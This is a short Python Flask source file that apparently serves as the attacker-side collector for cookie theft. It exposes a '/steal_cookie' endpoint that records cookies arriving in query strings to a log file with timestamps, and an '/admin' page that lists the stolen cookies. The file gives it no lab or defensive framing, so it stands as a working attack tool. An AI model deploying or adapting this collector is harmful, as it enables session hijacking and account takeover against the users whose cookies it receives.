from flask import Flask, request, render_template
from flask_socketio import SocketIO
from datetime import datetime

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")  # Enable Socket.IO with CORS

# Endpoint to log cookies
@app.route('/steal_cookie', methods=['GET'])
def steal_cookie():
    stolen_cookie = request.args.get('cookie')
    if stolen_cookie:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f'Stolen Cookie at {timestamp}: {stolen_cookie}')
        with open('cookie_log.txt', 'a') as file:
            file.write(f"{timestamp} - {stolen_cookie}\n")
        return "Cookie logged!", 200
    return "No cookie found!", 400


# Admin page to view logs
@app.route('/admin')
def admin():
    try:
        with open('cookie_log.txt', 'r') as file:
            logs = file.readlines()
    except FileNotFoundError:
        logs = ["No cookies logged yet."]
    return render_template('admin.html', logs=logs)


if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
